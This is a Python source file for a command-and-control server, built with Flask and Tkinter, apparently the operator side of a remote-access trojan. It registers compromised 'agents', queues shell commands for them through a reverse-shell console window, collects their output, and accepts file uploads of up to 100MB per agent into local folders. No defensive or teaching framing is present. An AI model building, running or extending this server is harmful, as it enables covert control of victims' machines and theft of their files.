from flask import Flask, request, Response
import logging
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import uuid
import datetime
import os
from queue import Queue, Empty
from werkzeug.serving import WSGIRequestHandler

# Configure better logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Custom request handler with longer timeouts
class CustomRequestHandler(WSGIRequestHandler):
    timeout = 120  # 2 minute timeout

class AgentHandler:
    def __init__(self):
        self.agents = {}
        self.lock = threading.Lock()
        # Create uploads directory if it doesn't exist
        self.uploads_dir = "downloads"
        os.makedirs(self.uploads_dir, exist_ok=True)

    def register_agent(self, agent_id):
        with self.lock:
            if agent_id not in self.agents:
                self.agents[agent_id] = {
                    'cmd_queue': Queue(),
                    'output': [],
                    'last_seen': datetime.datetime.now(),
                    'active': True
                }
                # Create agent-specific directory
                agent_dir = os.path.join(self.uploads_dir, agent_id)
                os.makedirs(agent_dir, exist_ok=True)

    def add_command(self, agent_id, command):
        with self.lock:
            if agent_id in self.agents:
                self.agents[agent_id]['cmd_queue'].put(command)

    def get_command(self, agent_id):
        with self.lock:
            agent = self.agents.get(agent_id)
            if agent and agent['active']:
                try:
                    return agent['cmd_queue'].get_nowait()
                except Empty:
                    return None
        return None

    def add_output(self, agent_id, output):
        with self.lock:
            if agent_id in self.agents:
                self.agents[agent_id]['output'].extend(output)
                self.agents[agent_id]['last_seen'] = datetime.datetime.now()

    def get_output(self, agent_id):
        with self.lock:
            outputs = self.agents.get(agent_id, {}).get('output', [])
            # Clear outputs after retrieving
            if agent_id in self.agents:
                self.agents[agent_id]['output'] = []
            return outputs

    def cleanup_agents(self):
        with self.lock:
            now = datetime.datetime.now()
            to_remove = []
            for agent_id, data in self.agents.items():
                if (now - data['last_seen']).seconds > 300:  # 5 minute timeout
                    to_remove.append(agent_id)
            for agent_id in to_remove:
                del self.agents[agent_id]

    def save_uploaded_file(self, agent_id, file_path, file_data):
        """Save uploaded file to the appropriate directory"""
        # Create directory structure for file
        agent_dir = os.path.join(self.uploads_dir, agent_id)

        # Remove any leading path separators to prevent directory traversal
        file_path = file_path.lstrip('/\\')

        # Remove any drive letter (Windows)
        if ':' in file_path:
            file_path = file_path.split(':', 1)[1].lstrip('/\\')

        # Create directory structure
        full_path = os.path.join(agent_dir, file_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        # Write file
        with open(full_path, 'wb') as f:
            f.write(file_data)

        # Add output message
        self.add_output(agent_id, [f"[+] Received file: {file_path} ({len(file_data)} bytes)"])
        return full_path

class ReverseShellWindow(tk.Toplevel):
    def __init__(self, parent, agent_id, agent_handler):
        super().__init__(parent)
        self.title(f"Agent Shell: {agent_id}")
        self.agent_id = agent_id
        self.agent_handler = agent_handler
        self.command_history = []
        self.history_index = -1
        self.prompt = "C:\\> "
        self.input_mark = "input_start"

        # Configure console
        self.console = scrolledtext.ScrolledText(
            self,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="black",
            fg="#00ff00",
            insertbackground="#00ff00",
            undo=True
        )
        self.console.pack(expand=True, fill='both')

        # Set up input tracking
        self.console.mark_set(self.input_mark, "end-1c")
        self.console.mark_gravity(self.input_mark, "left")
        self.console.bind("<Key>", self.on_key)
        self.console.bind("<Return>", self.on_enter)
        self.console.bind("<Up>", self.on_up)
        self.console.bind("<Down>", self.on_down)

        # Initial prompt
        self.console.insert("end", self.prompt)
        self.console.mark_set(self.input_mark, "end-1c")
        self.console.see("end")
        self.console.focus_set()

    def write_output(self, text):
        current_position = self.console.index("insert")
        self.console.insert("end", text)
        self.console.mark_set(self.input_mark, "end-1c")
        self.console.see("end")
        # Restore cursor position
        self.console.mark_set("insert", current_position)

    def on_key(self, event):
        # Prevent editing before input mark
        if self.console.compare("insert", "<", self.input_mark):
            return "break"
        # Allow normal editing if after input mark
        return None

    def on_enter(self, event):
        # Get command from input line
        cmd = self.console.get(self.input_mark, "end-1c").strip()
        if cmd:
            self.command_history.append(cmd)
            self.history_index = -1
            self.agent_handler.add_command(self.agent_id, cmd)

            # Add new prompt
            self.console.insert("end", "\n" + self.prompt)
            self.console.mark_set(self.input_mark, "end-1c")
            self.console.see("end")

        return "break"  # Prevent default Enter behavior

    def on_up(self, event):
        if self.command_history and self.history_index < len(self.command_history)-1:
            self.history_index += 1
            self.set_command(self.command_history[-(self.history_index+1)])
        return "break"

    def on_down(self, event):
        if self.history_index > 0:
            self.history_index -= 1
            self.set_command(self.command_history[-(self.history_index+1)])
        elif self.history_index == 0:
            self.history_index = -1
            self.clear_command()
        return "break"

    def set_command(self, cmd):
        self.console.delete(self.input_mark, "end-1c")
        self.console.insert(self.input_mark, cmd)
        self.console.mark_set("insert", "end")

    def clear_command(self):
        self.console.delete(self.input_mark, "end-1c")

    def update_display(self):
        outputs = self.agent_handler.get_output(self.agent_id)
        if outputs:
            for output in outputs:
                # Insert output before current prompt
                self.console.insert(self.input_mark, f"\n{output}")

            # Add a new prompt if needed
            if not self.console.get("end-2c", "end").endswith(self.prompt):
                self.console.insert("end", f"\n{self.prompt}")

            self.console.mark_set(self.input_mark, "end-1c")
            self.console.see("end")

        self.after(500, self.update_display)

class LogGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Server - Active Agents: 0")

        # Server controls
        self.server_frame = ttk.Frame(root)
        self.server_frame.pack(fill=tk.X, padx=5, pady=5)

        self.start_btn = ttk.Button(self.server_frame, text="Start Server", command=self.start_server)
        self.start_btn.pack(side=tk.LEFT, padx=2)

        self.stop_btn = ttk.Button(self.server_frame, text="Stop Server", state=tk.DISABLED, command=self.stop_server)
        self.stop_btn.pack(side=tk.LEFT, padx=2)

        # Agent list
        self.agent_list = ttk.Treeview(root, columns=("id", "last_seen"), show="headings")
        self.agent_list.heading("id", text="Agent ID")
        self.agent_list.heading("last_seen", text="Last Checkin")
        self.agent_list.column("id", width=300)
        self.agent_list.column("last_seen", width=150)
        self.agent_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.agent_list.bind("<Double-1>", self.open_shell)

        # Status bar
        self.status = ttk.Label(root, text="Server: Stopped", anchor=tk.W)
        self.status.pack(fill=tk.X, padx=5, pady=2)

        # Agent handling
        self.agent_handler = AgentHandler()
        self.flask_thread = None
        self.server_running = False
        self.update_thread = threading.Thread(target=self.update_interface, daemon=True)
        self.update_thread.start()

    def start_server(self):
        if not self.server_running:
            self.flask_thread = threading.Thread(target=self.run_flask_server, daemon=True)
            self.flask_thread.start()
            self.server_running = True
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.update_status("Server running on http://0.0.0.0:5000")

    def stop_server(self):
        if self.server_running:
            self.server_running = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.update_status("Server stopped")

    def open_shell(self, event):
        item = self.agent_list.selection()
        if item:
            agent_id = self.agent_list.item(item)['values'][0]
            shell = ReverseShellWindow(self.root, agent_id, self.agent_handler)
            shell.update_display()

    def update_status(self, message):
        self.status.config(text=message)

    def update_interface(self):
        while True:
            if self.server_running:
                # Update agent list
                self.agent_list.delete(*self.agent_list.get_children())
                for agent_id, data in self.agent_handler.agents.items():
                    last_seen = data['last_seen'].strftime("%H:%M:%S")
                    self.agent_list.insert("", "end", values=(agent_id, last_seen))

                # Update window title
                self.root.title(f"C2 Server - Active Agents: {len(self.agent_handler.agents)}")

            threading.Event().wait(1)

    def run_flask_server(self):
        app = Flask(__name__)
        logging.getLogger('werkzeug').setLevel(logging.ERROR)

        @app.route('/register', methods=['POST'])
        def register():
            agent_id = str(uuid.uuid4())
            self.agent_handler.register_agent(agent_id)
            return Response(agent_id, status=201)

        @app.route('/checkin/<agent_id>', methods=['POST'])
        def checkin(agent_id):
            try:
                # Process command output
                output = request.data.decode('utf-8', errors='replace').strip()
                if output:
                    self.agent_handler.add_output(agent_id, output.split('\n'))

                # Get next command
                command = self.agent_handler.get_command(agent_id) or ''
                return Response(command, mimetype='text/plain')

            except Exception as e:
                logging.error(f"Checkin error: {str(e)}")
                return Response(status=500)

        @app.route('/upload/<agent_id>/<path:file_path>', methods=['POST'])
        def upload_file(agent_id, file_path):
            try:
                # Register agent if not already registered
                if agent_id not in self.agent_handler.agents:
                    self.agent_handler.register_agent(agent_id)

                # Log request details for debugging
                content_type = request.headers.get('Content-Type', 'unknown')
                content_length = request.headers.get('Content-Length', 'unknown')
                logging.info(f"Upload request: agent={agent_id}, file={file_path}, type={content_type}, size={content_length}")

                # Get file data from request body
                file_data = request.data

                if not file_data:
                    logging.error("No data received in request body")
                    return Response("No data received", status=400)

                # Save the file
                saved_path = self.agent_handler.save_uploaded_file(agent_id, file_path, file_data)

                # Update last seen time
                if agent_id in self.agent_handler.agents:
                    self.agent_handler.agents[agent_id]['last_seen'] = datetime.datetime.now()

                # Log success
                logging.info(f"File saved successfully: {saved_path} ({len(file_data)} bytes)")
                return Response(f"File saved to {saved_path}", status=200)

            except Exception as e:
                error_msg = f"Upload error: {str(e)}"
                logging.error(error_msg)
                self.agent_handler.add_output(agent_id, [f"[!] {error_msg}"])
                return Response(error_msg, status=500)

        # Set Flask server to handle larger file uploads
        app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB limit

        # Run the Flask app with larger request timeouts
        app.run(
            host='0.0.0.0',
            port=5000,
            debug=False,
            use_reloader=False,
            threaded=True,
            request_handler=CustomRequestHandler
        )

if __name__ == "__main__":
    root = tk.Tk()
    gui = LogGUI(root)
    root.mainloop()